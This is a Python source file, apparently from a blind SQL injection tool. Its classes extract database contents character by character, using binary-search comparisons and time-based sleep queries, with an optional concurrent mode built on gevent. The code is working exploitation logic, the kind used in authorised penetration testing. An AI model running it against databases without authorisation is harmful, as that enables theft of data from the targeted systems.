#file: technique.py

from . import debug
from .truth import Truth
from .settings import *
from .exceptions import *

import gevent
from copy import copy



class Technique(object):
    '''
    This is a sql injection teqnique. Eg. Union based or Time based... Techniques need
    to implement at minimum the run method which is what actually launches the technique.
    Techniques will usually also take a user_query (query we are trying to run on the db).
    The class init init will (almost?) always take a make_request_func as a param. This
    option specifies the function to call to make an actual request. 
    '''
    def __init__(self,make_request_func,query): 
        self.query = query
        self.make_request_func = make_request_func

        if type(self) == Technique:
            raise NotImplemented

    def run(self):
        '''
        run the exploit
        '''
        raise NotImplemented("technique.run")


class BlindTechnique(Technique):
    def __init__(self,truth = Truth(), *args, **kwargs):
        self.truth = truth
        super(BlindTechnique,self).__init__(*args,**kwargs)

    def run(self,user_query,sleep=None):
        self.sleep = sleep

        user_query = user_query
    
        results = []
        row_index = 0
        row = True
        #we get more rows until the table is over
        while row:            
            #if this isnt the first iteration
            if row != True:
                results.append(row)
            row = self._get_next_row(row_index,user_query)
            row_index += 1
        return results

    def _get_next_row(self,row_index,user_query):
        '''finding a row'''
        row = ""
        char_index = 1
        char = True
        #we get more chars until the row is over
        while char:
            #if this isnt the first iteration
            if char != True:
                row += char
            char = self._get_next_char(char_index,row_index,user_query)

            char_index += 1
        if row != "":
            return row
        else:
            return False

    def _get_next_char(self,char_index,row_index,user_query):
        '''finding a character'''
        low = 0
        high = CHARSET_LEN
        while low < high:
            mid = (low+high)/2
            if self._is_greater(row_index, char_index, CHARSET[mid],user_query):
                #print "data[%d][%d] < %s (%d)" % (row_index,char_index,CHARSET[mid],mid)
                high = mid
            elif self._is_less(row_index, char_index, CHARSET[mid],user_query):
                #print "data[%d][%d] > %s (%d)" % (row_index,char_index,CHARSET[mid],mid)
                low = mid + 1
            elif low < CHARSET_LEN and self._is_equal(row_index, char_index, CHARSET[mid],user_query):
                #print "data[%d][%d] = %s (%d)" % (row_index,char_index,CHARSET[mid],ord(CHARSET[mid]))
                return CHARSET[mid]
            else:
                return False
    
    def _is_greater(self,row_index,char_index,char_val,user_query):
        '''
        Returns true if the specified character in the specified row is greater
        that char_value. It is up to you how to implement this...
        '''
        query = copy(self.query)
        query.set_option('user_query',user_query)
        query.set_option('row_index',str(row_index))
        query.set_option('char_index',str(char_index))
        query.set_option('char_val',str(ord(char_val)))
        query.set_option('sleep',str(self.sleep))
        query.set_option('comparator','<')
        query_string = query.render()

        return self.truth.test(self.make_request_func(query_string))

    def _is_less(self,row_index,char_index,char_val,user_query):
        '''
        Returns true if the specified character in the specified row is les
        than char_value. It is up to you how to implement this...
        '''
        query = copy(self.query)
        query.set_option('user_query',user_query)
        query.set_option('row_index',str(row_index))
        query.set_option('char_index',str(char_index))
        query.set_option('char_val',str(ord(char_val)))
        query.set_option('sleep',str(self.sleep))
        query.set_option('comparator','>')
        query_string = query.render()

        return self.truth.test(self.make_request_func(query_string))

    def _is_equal(self,row_index,char_index,char_val,user_query):
        '''
        Returns true if the specified character in the specified row is equal
        that char_value. It is up to you how to implement this...
        '''  
        query = copy(self.query)
        query.set_option('user_query',user_query)
        query.set_option('row_index',str(row_index))
        query.set_option('char_index',str(char_index))
        query.set_option('char_val',str(ord(char_val)))
        query.set_option('sleep',str(self.sleep))
        query.set_option('comparator','=')
        query_string = query.render()

        return self.truth.test(self.make_request_func(query_string))


class Character:
    def __init__(self,row_index,char_index,query,user_query,make_request_func,truth,sleep):
        self.row_index = row_index
        self.char_index = char_index
        self.query = query
        self.user_query = user_query
        self.make_request_func = make_request_func
        self.truth = truth
        self.sleep = sleep

        self.char_val = CHARSET[len(CHARSET)//2]

        self.error = False

    def go(self):
        '''keep trying to figure out this character's value. each time this method is called a request will be sent'''
        low = 0
        high = CHARSET_LEN        
        while low < high:
            mid = (low+high)//2
            self.char_val = CHARSET[mid]
            if self._is_greater(self.char_val):
                #print "data[%d][%d] < %s (%d)" % (self.row_index,self.char_index,CHARSET[mid],mid)
                high = mid
            elif self._is_less(self.char_val):
                #print "data[%d][%d] > %s (%d)" % (self.row_index,self.char_index,CHARSET[mid],mid)
                low = mid + 1
            elif low < CHARSET_LEN and self._is_equal(self.char_val):
                #print "data[%d][%d] = %s (%d)" % (self.row_index,self.char_index,CHARSET[mid],ord(CHARSET[mid]))
                return True
            else:
                self.error = True
                return False

    def _is_greater(self,char_val):
        '''
        Returns true if the specified character in the specified row is greater
        that char_value. It is up to you how to implement this...
        '''
        query = copy(self.query)
        query.set_option('user_query',self.user_query)
        query.set_option('row_index',str(self.row_index))
        query.set_option('char_index',str(self.char_index))
        query.set_option('char_val',str(ord(char_val)))
        query.set_option('sleep',str(self.sleep))
        query.set_option('comparator','<')
        query_string = query.render()

        return self.truth.test(self.make_request_func(query_string))

    def _is_less(self,char_val):
        '''
        Returns true if the specified character in the specified row is les
        than char_value. It is up to you how to implement this...
        '''
        query = copy(self.query)
        query.set_option('user_query',self.user_query)
        query.set_option('row_index',str(self.row_index))
        query.set_option('char_index',str(self.char_index))
        query.set_option('char_val',str(ord(char_val)))
        query.set_option('sleep',str(self.sleep))
        query.set_option('comparator','>')
        query_string = query.render()

        return self.truth.test(self.make_request_func(query_string))

    def _is_equal(self,char_val):
        '''
        Returns true if the specified character in the specified row is equal
        that char_value. It is up to you how to implement this...
        '''  
        query = copy(self.query)
        query.set_option('user_query',self.user_query)
        query.set_option('row_index',str(self.row_index))
        query.set_option('char_index',str(self.char_index))
        query.set_option('char_val',str(ord(char_val)))
        query.set_option('sleep',str(self.sleep))
        query.set_option('comparator','=')
        query_string = query.render()

        return self.truth.test(self.make_request_func(query_string))

    def __repr__(self):
        '''return a character if we have finished without errors'''
        return [self.char_val,''][self.error]

    def __str__(self):
        '''return a character if we have finished without errors'''
        return [self.char_val,''][self.error]


class BlindTechniqueConcurrent(Technique):
    def __init__(self,truth = Truth(), *args, **kwargs):
        self.truth = truth
        super(BlindTechniqueConcurrent,self).__init__(*args,**kwargs)
    
    def __character_getter__(self):
        try:
            while True:
                current_index = self.chargen.next()
                self.glets[gevent.getcurrent()] = current_index
        
                if not self.rows[-1][current_index].go():
                    #reached the end of the row. kill all greenlets after us
                    for gl in self.glets:
                        if self.glets[gl] > current_index:
                            gl.kill()
                    
                    return True
        except gevent.GreenletExit:
            self.rows[-1][current_index].error = True
            return True

    def __character_generator__(self):
        char_index = 1
        while True:
            c = Character(\
                row_index           = len(self.rows)-1,\
                char_index          = char_index,\
                query               = self.query,\
                user_query          = self.user_query,\
                make_request_func   = self.make_request_func,\
                truth               = self.truth,\
                sleep               = self.sleep)
            self.rows[-1].append(c)
            yield len(self.rows[-1]) - 1
            char_index += 1        


    def run(self,user_query,sleep=None,concurrency=20):
        self.user_query = user_query
        self.sleep = sleep
    
        self.rows = []
        #until we get an empty row
        while len(self.rows) == 0 or len(self.rows[-1]) > 0:
            self.rows.append([])

            #chargen generates the character objects
            self.chargen = self.__character_generator__()

            self.glets = {}
            for i in xrange(concurrency):
                self.glets[(gevent.spawn(self.__character_getter__))] = None

            gevent.joinall(self.glets.keys())
            self.rows[-1] = ''.join([str(c) for c in self.rows[-1]])

        try: self.rows.pop()
        except IndexError: pass

        return self.rows